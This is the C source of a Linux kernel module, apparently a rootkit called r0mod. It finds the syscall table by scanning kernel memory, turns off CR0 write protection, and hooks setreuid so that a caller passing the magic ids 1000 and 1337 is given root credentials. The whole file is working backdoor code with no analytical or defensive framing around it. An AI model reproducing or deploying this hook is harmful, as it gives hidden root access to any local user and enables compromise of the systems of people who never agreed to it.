#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/unistd.h>   // syscalls
#include <linux/syscalls.h> // syscalls

#include <r0mod/global.h>

unsigned long *sct;

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if((ruid == 1000) && (euid == 1337))
    {
        printk("[Correct]: You got the correct ids.\n");
        commit_creds(prepare_kernel_cred(0));

        return new_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}

unsigned long *find_sys_call_table(void)
{
    unsigned long i;

    for(i = (unsigned long)&loops_per_jiffy;
        i < (unsigned long)&boot_cpu_data;
        i += sizeof(void *))
    {
        unsigned long *sct = (unsigned long *)i;

        if(sct[__NR_close] == (unsigned long)sys_close)
        {
            printk("sys_call_table found @ %lx\n", (unsigned long)sct);
            return sct;
        }
    }

    return NULL;
}

static int __init r0mod_init(void)
{
    printk("Module starting...\n");

    printk("Search Start: %lx\n", (unsigned long)&loops_per_jiffy);
    printk("Search End:   %lx\n", (unsigned long)&boot_cpu_data);

    if((sct = find_sys_call_table()) == NULL)
    {
        printk("sct == NULL\n");
        return -1;
    }

    printk("sys_call_table hooked @ %lx\n", (unsigned long)sct);

    write_cr0(read_cr0() & (~0x10000));

    orig_setreuid = (void *)sct[__NR_setreuid];
    sct[__NR_setreuid] = (unsigned long)new_setreuid;

    write_cr0(read_cr0() | 0x10000);

    return 0;
}


static void __exit r0mod_exit(void)
{
    printk("Module ending...\n");

    if(sct != NULL)
    {
        write_cr0(read_cr0() & (~0x10000));

        sct[__NR_setreuid] = (unsigned long)orig_setreuid;

        write_cr0(read_cr0() | 0x10000);
    }
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
